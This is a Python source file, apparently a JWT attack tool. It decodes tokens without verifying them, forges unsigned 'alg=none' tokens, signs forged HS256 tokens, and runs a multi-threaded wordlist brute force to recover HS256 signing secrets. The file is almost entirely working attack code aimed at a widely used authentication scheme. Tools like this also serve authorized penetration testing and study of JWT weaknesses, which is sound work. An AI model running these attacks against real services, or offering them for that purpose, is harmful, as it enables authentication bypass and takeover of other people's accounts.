import jwt
import json
import base64
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed

def decode_token(token):
    """Decodes a JWT and prints its header and payload."""
    print("\n[*] Decoding JWT...")
    try:
        header = jwt.get_unverified_header(token)
        print(f"{Fore.CYAN}[+] JWT Header: {json.dumps(header, indent=2)}{Style.RESET_ALL}")
        
        payload = jwt.decode(token, options={"verify_signature": False})
        print(f"{Fore.CYAN}[+] JWT Payload: {json.dumps(payload, indent=2)}{Style.RESET_ALL}")
        
        return header, payload
        
    except jwt.exceptions.DecodeError as e:
        print(f"{Fore.RED}[-] Invalid JWT: {e}{Style.RESET_ALL}")
        return None, None

def attack_alg_none(token):
    """Performs the 'alg=none' attack on a JWT."""
    print("\n[*] Performing 'alg=none' attack...")
    try:
        original_payload = jwt.decode(token, options={"verify_signature": False})
        new_header = {"alg": "none", "typ": "JWT"}
        
        encoded_header = base64.urlsafe_b64encode(json.dumps(new_header).encode()).rstrip(b'=').decode()
        encoded_payload = base64.urlsafe_b64encode(json.dumps(original_payload).encode()).rstrip(b'=').decode()
        
        malicious_token = f"{encoded_header}.{encoded_payload}."
        
        print(f"{Fore.GREEN}[+] 'alg=none' token generated successfully.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Use this token to test endpoints that require authentication:{Style.RESET_ALL}")
        print(f"{Style.BRIGHT}{malicious_token}{Style.RESET_ALL}")
        
        return malicious_token
    except jwt.exceptions.DecodeError as e:
        print(f"{Fore.RED}[-] Invalid JWT provided. Cannot perform attack: {e}{Style.RESET_ALL}")
        return None

def sign_hs256_token(payload_str, secret):
    """Creates a new JWT signed with HS256 algorithm and the given secret."""
    print("\n[*] Forging new HS256 token...")
    try:
        payload = json.loads(payload_str)
        new_token = jwt.encode(payload, secret, algorithm="HS256")
        
        print(f"{Fore.GREEN}[+] New token generated successfully.{Style.RESET_ALL}")
        print(f"{Style.BRIGHT}{new_token}{Style.RESET_ALL}")
        return new_token
        
    except json.JSONDecodeError:
        print(f"{Fore.RED}[-] Invalid payload format. Please provide a valid JSON string.{Style.RESET_ALL}")
        return None
    except Exception as e:
        print(f"{Fore.RED}[-] An error occurred during token creation: {e}{Style.RESET_ALL}")
        return None

def _try_key(token, key):
    """Helper function for multi-threading. Tries one key."""
    try:
        jwt.decode(token, key, algorithms=["HS256"])
        return key
    except jwt.exceptions.InvalidSignatureError:
        return None
    except Exception:
        return None

def attack_hs256_bruteforce(token, wordlist_file):
    """Performs a multi-threaded brute-force attack to find the HS256 secret key."""
    print("\n[*] Starting HS256 secret key brute-force attack...")
    header = jwt.get_unverified_header(token)
    if header.get('alg') != 'HS256':
        print(f"{Fore.RED}[-] Attack failed: Token algorithm is not HS256.{Style.RESET_ALL}")
        return

    try:
        with open(wordlist_file, 'r', errors='ignore') as f:
            keys = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Error: Wordlist file not found at '{wordlist_file}'{Style.RESET_ALL}")
        return

    print(f"[*] Loaded {len(keys)} keys. Starting brute-force with multiple threads...")

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(_try_key, token, key): key for key in keys}
        
        for future in as_completed(futures):
            found_key = future.result()
            if found_key:
                print(f"\n{Style.BRIGHT}{Fore.GREEN}[!!!] SECRET KEY FOUND: {found_key}{Style.RESET_ALL}")
                for f in futures:
                    f.cancel()
                return found_key

    print(f"{Fore.YELLOW}[-] Secret key not found in the provided wordlist.{Style.RESET_ALL}")
